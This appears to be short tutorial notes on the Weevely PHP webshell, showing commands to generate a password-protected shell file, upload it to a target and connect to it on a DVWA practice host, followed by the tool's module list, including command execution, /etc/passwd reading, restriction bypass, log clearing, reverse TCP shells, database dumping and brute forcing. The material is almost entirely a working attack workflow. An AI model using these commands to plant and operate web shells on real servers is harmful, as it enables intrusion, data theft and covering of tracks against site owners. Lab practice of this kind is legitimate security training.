https://securityonline.info/weevely-tutorial-php-webshell/
```bash - kali
weevely generate mypassword shelly.php
```
Now simply upload your Shelly.php file to target.
```bash - kali
weevely http://dvwa.local/hackable/uploads/shelly.php mypassword
```
```
 :shell_php                    Execute PHP commands.
 :shell_sh                     Execute shell commands.
 :shell_su                     Execute commands with su.
 :audit_etcpasswd              Read /etc/passwd with different techniques.
 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.
 :audit_filesystem             Audit the file system for weak permissions.
 :audit_suidsgid               Find files with SUID or SGID flags.
 :audit_phpconf                Audit PHP configuration.
 :file_download                Download file from remote filesystem.
 :file_zip                     Compress or expand zip files.
 :file_touch                   Change file timestamp.
 :file_mount                   Mount remote filesystem using HTTPfs.
 :file_clearlog                Remove string from a file.
 :file_find                    Find files with given names and attributes.
 :file_ls                      List directory content.
 :file_tar                     Compress or expand tar archives.
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL.
 :file_rm                      Remove remote file.
 :file_enum                    Check existence and permissions of a list of paths.
 :file_upload                  Upload file to remote filesystem.
 :file_grep                    Print lines matching a pattern in multiple files.
 :file_webdownload             Download an URL.
 :file_gzip                    Compress or expand gzip files.
 :file_cd                      Change current working directory.
 :file_cp                      Copy single file.
 :file_bzip2                   Compress or expand bzip2 files.
 :file_read                    Read remote file from the remote filesystem.
 :file_check                   Get attributes and permissions of a file.
 :file_edit                    Edit remote file on a local editor.
 :net_ifconfig                 Get network interfaces addresses.
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.
 :net_phpproxy                 Install PHP proxy on the target.
 :net_mail                     Send mail.
 :net_curl                     Perform a curl-like HTTP request.
 :net_scan                     TCP Port scan.
 :sql_console                  Execute SQL query or run console.
 :sql_dump                     Multi dbms mysqldump replacement.
 :backdoor_reversetcp          Execute a reverse TCP shell.
 :backdoor_tcp                 Spawn a shell on a TCP port.
 :bruteforce_sql               Bruteforce SQL database.
 :system_info                  Collect system information.
 :system_extensions            Collect PHP and webserver extension list.
 :system_procs                 List running processes.
```
